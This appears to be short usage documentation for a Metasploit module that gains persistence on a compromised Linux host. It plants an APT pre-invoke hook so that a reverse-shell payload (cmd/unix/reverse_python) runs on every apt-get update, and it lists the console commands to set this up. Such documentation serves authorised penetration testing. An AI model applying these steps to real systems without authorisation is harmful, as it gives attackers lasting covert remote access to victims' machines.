## Apt package manager persistence

This module will run a payload when the package manager is used. No
handler is ran automatically so you must configure an appropriate
exploit/multi/handler to connect. Module creates a pre-invoke hook
for APT in apt.conf.d. The Hook name syntax is numeric followed by text.  

### Testing

1. Exploit a box
2. `use linux/local/apt_package_manager_persistence`
3. `set SESSION <id>`
4. `set PAYLOAD cmd/unix/reverse_python` configure the payload as needed
5. `exploit`

When the system runs apt-get update the payload will launch.  You must set handler accordingly.
